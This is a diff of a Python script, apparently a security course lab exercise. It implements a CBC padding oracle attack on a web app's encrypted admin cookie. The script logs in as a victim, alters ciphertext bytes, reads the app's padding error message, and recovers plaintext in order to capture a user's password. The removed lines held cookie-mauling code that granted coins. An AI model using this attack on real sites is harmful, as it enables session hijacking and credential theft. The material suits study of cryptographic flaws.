@@ -54,10 +54,9 @@ def po_attack_2blocks(po, ctx):
     print("C0 (len {}): {}".format(len(c0), c0))
     print("C1 (len {}): {}".format(len(c1), c1))
 
-    # TODO: Implement padding oracle attack for 2 blocks of messages.
+    # Implement padding oracle attack for 2 blocks of messages.
 
     plaintext = bytearray(16)
-    passes = 0
     for i in range(15, -1, -1):
         test = bytearray(16)
         for j in range(i + 1, 16):
@@ -67,9 +66,8 @@ def po_attack_2blocks(po, ctx):
             C1_prime = test + c1
             if check_padding_response(C1_prime):
                 print("Padding passed: {}".format((i,val)))
-                passes += 1
                 plaintext[i] = val ^ c0[i] ^ (16 - i)
-                break
+                break # Keep me
     return plaintext
 
 def po_attack(po, ctx):
@@ -78,23 +76,29 @@ def po_attack(po, ctx):
     @po: an instance of padding oracle. 
     You don't have to unpad the message.
     """
-    ctx_blocks = list(split_into_blocks(ctx, po.block_length)) # TODO: Is this block length correct for the hex string?
+    ctx_blocks = list(split_into_blocks(ctx, int(po.block_length)))
     nblocks = len(ctx_blocks)
+    print("Number of ciphertext blocks: {}".format(nblocks))
     # TODO: Implement padding oracle attack for arbitrary length message.
-
-def check_response_code(response):
-    """
-    Given a response object, check its status code
-    """
-    return response.status_code == codes.ok
-
+  
+    # plaintext = bytearray(int(po.block_length) * nblocks)
+    plaintext = bytearray()
+    for i in range(nblocks - 1):
+         print("Checking blocks C{} and C{}".format(i, i+1))
+         plain = po_attack_2blocks(po, ctx_blocks[i] + ctx_blocks[i+1])
+         print("Plain: {}".format(plain))
+         # plaintext = plain + plaintext
+         plaintext += plain
+         print("Concat plaintext: {}".format(plaintext))
+         
 def is_response_ok(response):
     """
     Given a requests.Response object, does the 'error' div exist?
     """
-    error = int(response.text.find('error'))
+    # print(response.text)
+    error = int(response.text.find('Bad padding for admin cookie'))
     if error != -1:
-        #print("Error Div found at index: {}".format(error))
+        # print("Error Div found at index: {}".format(error))
         return False
     return True
 
@@ -107,14 +111,8 @@ def check_padding_response(cookie):
     # print("Len of cookie: {}".format(len(cookie)))
     # print("Cookies after maul: {}".format(sess.cookies.get_dict()))
     result, response = do_setcoins_form(sess, uname, 5000)
-    if result == False:
-        # print("Check padding response FALSE")
-        return False
-    
-    return True
-    # return is_response_ok(response)
-    # TODO: Changed webserver to return 400 code when padding failed
-    # return check_response_code(response)
+
+    return is_response_ok(response)
 
 if __name__ == "__main__":
     print("Running Padding Oracle Attack")
@@ -123,6 +121,8 @@ if __name__ == "__main__":
     print("Cookie pre logon: {}".format(sess.cookies.get_dict()))
     uname ="victim"
     pw = "victim"
+    # uname = "andrew"
+    # pw = "hellomynameisandrewpalmeriliketosurf"
     assert(do_login_form(sess, uname,pw))
     print("Cookies after logon: {}".format(sess.cookies.get_dict()))
     admin_cookie = sess.cookies.get_dict()["admin"]
@@ -133,7 +133,6 @@ if __name__ == "__main__":
     # First byte (C0 == IV)
     C0 = admin_cookie_bytes[0]
     print("CO: {}".format(C0))
-    admin_cookie_bytes[0] = 1
 
     # Check padding response success
     # success = check_padding_response(bytes(16))
@@ -141,39 +140,18 @@ if __name__ == "__main__":
 
     TEST_COOKIE = bytearray.fromhex("e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d")
     print("Test cookie (len {}): {}".format(len(TEST_COOKIE), TEST_COOKIE))
-    # success = check_padding_response(TEST_COOKIE)
 
     print("test cookie first 32 bytes: {}".format(TEST_COOKIE[:32]))
     first_two_blocks = TEST_COOKIE[:32]
+
     # Instantitate padding oracle
     po = PaddingOracle(SETCOINS_FORM_URL)
-    result = po_attack_2blocks(po, first_two_blocks)
-    print("PO Attack 2 blocks result: {}".format(result))
+    # result = po_attack_2blocks(po, first_two_blocks)
+    # print("PO Attack 2 blocks result: {}".format(result))
 
+    # Test with full test cookie
+    # full_result = po_attack(po, TEST_COOKIE)
 
-    # TODO: Maul code from part 1.1
-    # Maul the admin cookie in the 'sess' object here
-    # admin_cookie = sess.cookies.get_dict()["admin"]
-    # print("Admin cookie: {}".format(admin_cookie))
-    # admin_cookie_bytes = bytearray.fromhex(admin_cookie)
-    # print("Admin cookie bytes: {}".format(admin_cookie_bytes))
-    # a = admin_cookie_bytes[0]
-    # b = 1
-    # c = a ^ b
-    # admin_cookie_bytes[0] = c
-    # print("XOR value: {}".format(c))
-    # print("Mauled: {}".format(admin_cookie_bytes))
-    # maul = admin_cookie_bytes.hex()
-
-    # # Set new admin cookie with mauled value
-    # sess.cookies.set("admin", None)
-    # sess.cookies.set("admin", maul)
-    # print("Cookies after maul: {}".format(sess.cookies.get_dict()))
-    
-    # set coins to 5000 coins via the admin's power
-    # target_uname = uname
-    # amount = 5000
-    # result, response = do_setcoins_form(sess, target_uname, amount)
-    # print("Attack successful? " + str(result))
-    # print("Response: {}".format(response.content))
+    # TODO: Capture user's password from admin cookie
+    password = po_attack(po, admin_cookie_bytes)
 
